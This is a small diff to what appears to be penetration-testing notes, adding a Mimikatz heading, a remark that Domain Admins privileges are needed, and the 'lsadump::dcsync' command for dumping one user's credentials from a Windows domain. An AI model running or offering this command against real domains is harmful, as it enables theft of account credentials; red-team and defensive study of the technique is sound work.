@@ -1,7 +1,6 @@
-
-
-# Exploitation
-- Mimikatz
+#mimikatz 
+### Mimikatz
+- Requires "Domain Admins" privs.
 ```powershell
 # Dump credentails for a single user
 lsadump::dcsync /domain:mydomain.local /user:<username>
